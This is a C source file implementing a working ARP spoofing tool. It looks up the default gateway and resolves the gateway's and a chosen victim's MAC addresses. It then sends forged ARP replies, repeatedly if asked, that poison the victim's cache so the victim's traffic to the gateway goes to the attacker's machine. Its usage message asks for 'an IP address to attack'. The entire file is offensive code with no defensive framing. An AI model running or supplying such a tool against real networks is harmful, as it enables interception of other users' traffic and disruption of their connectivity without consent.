#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

#define INTERFACE "enp4s0"

#define PRINT_MAC(msg, addr)                             \
	printf("%s:\t%02x:%02x:%02x:%02x:%02x:%02x\n",   \
			(msg),                           \
			(unsigned char) (addr)[0],       \
			(unsigned char) (addr)[1],       \
			(unsigned char) (addr)[2],       \
			(unsigned char) (addr)[3],       \
			(unsigned char) (addr)[4],       \
			(unsigned char) (addr)[5]);

#define DIE(format, error)                               \
	do {                                             \
		fprintf(stderr, "Error: ");              \
		fprintf(stderr, format, error);          \
		exit(EXIT_FAILURE);                      \
	} while (0)

uint32_t get_gateway(void)
{
	uint32_t ret;
	char buf[1024];
	const char interface[] = INTERFACE;
	const char seps[] = " \t";
	FILE *f = fopen("/proc/net/route", "r");

	/* hooray for ugly hacks */
	do {
		fgets(buf, 1024, f);
	} while (strncmp(interface, buf, sizeof(interface) - 1));

	char *p = strtok(buf, seps);
	p = strtok(NULL, seps);
	p = strtok(NULL, seps);
	p[8] = '\0';

	ret = strtol(p, NULL, 16);

	return ret;
}

void request_mac(int fd, struct ether_arp *req, const char *ip_str)
{
	/* this is the name of my ethernet interface */
	const char *if_name = INTERFACE;
	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	} else {
		DIE("%s\n", "interface name is too long");
	}

	/* this gets the number of the network interface */
	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
		DIE("%s\n", strerror(errno));
	}
	int ifindex = ifr.ifr_ifindex;

	/* will be sent to everyone */
	const unsigned char ether_broadcast_addr[] =
	{ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

	/* special socket address type used for AF_PACKET */
	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = ifindex;
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	/* construct the ARP request */
	req->arp_hrd = htons(ARPHRD_ETHER);
	req->arp_pro = htons(ETH_P_IP);
	req->arp_hln = ETHER_ADDR_LEN;
	req->arp_pln = sizeof(in_addr_t);
	req->arp_op  = htons(ARPOP_REQUEST);
	/* zero because that's what we're asking for */
	memset(&req->arp_tha, 0, sizeof(req->arp_tha));

	struct in_addr ip_addr = {0};
	if (!inet_aton(ip_str, &ip_addr)) {
		DIE("%s\n", strerror(errno));
	}
	memcpy(&req->arp_tpa, &ip_addr.s_addr, sizeof(req->arp_tpa));

	/* now to get our hardware address */
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		DIE("%s\n", strerror(errno));
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		DIE("%s\n", "not an ethernet interface");
	}
	memcpy(&req->arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(req->arp_sha));

	/* ...and our network address */
	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		DIE("%s\n", strerror(errno));
	}
	memcpy(&req->arp_spa, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(req->arp_spa));

	/* actually send it */
	if (sendto(fd, req, sizeof(struct ether_arp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		DIE("%s\n", strerror(errno));
	}

	if (recv(fd, req, sizeof(struct ether_arp), 0) == -1) {
		DIE("%s\n", strerror(errno));
	}
}

void arp_spoof(int fd, const unsigned char *victim_mac, const char *victim_ip, uint32_t gateway_ip)
{
	/* yes, it's a lot of copy/paste, but it works */
	struct ether_arp resp;
	struct in_addr ip_addr = {0};
	if (!inet_aton(victim_ip, &ip_addr)) {
		DIE("%s\n", strerror(errno));
	}

	const char *if_name = INTERFACE;
	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	} else {
		DIE("%s\n", "interface name is too long");
	}

	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
		DIE("%s\n", strerror(errno));
	}
	int ifindex = ifr.ifr_ifindex;

	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = ifindex;
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);

	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op  = htons(ARPOP_REPLY);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		DIE("%s\n", strerror(errno));
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		DIE("%s\n", "not an ethernet interface");
	}
	memcpy(&resp.arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &gateway_ip, sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, victim_mac, sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &ip_addr.s_addr, sizeof(resp.arp_tpa));

	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		DIE("%s\n", strerror(errno));
	}
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		DIE("%s\n", "please give an IP address to attack");
	}

	int repeat = 0;
	if (argc > 2) {
		repeat = strtoul(argv[2], NULL, 10);
	}

	int quiet = 0;
	if (argc > 3 && !strcmp(argv[3], "-q")) {
		quiet = 1;
	}

	/* get an ARP socket */
	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (fd == -1) {
		DIE("%s\n", strerror(errno));
	}

	struct ether_arp req;
	uint32_t gateway_ip = get_gateway();

	request_mac(fd, &req, inet_ntoa((struct in_addr) { .s_addr = gateway_ip }));
	if (!quiet) PRINT_MAC("Gateway MAC address", req.arp_sha);

	request_mac(fd, &req, argv[1]);
	if (!quiet) PRINT_MAC("Victim MAC address", req.arp_sha);

	arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);

	unsigned int count = 1;
	while (repeat) {
		arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);
		sleep(repeat);

		if (!quiet) {
			printf(".");
			if (count % 50 == 0)
				printf("\n");
		}

		fflush(stdout);
		++count;
	}

	return 0;
}
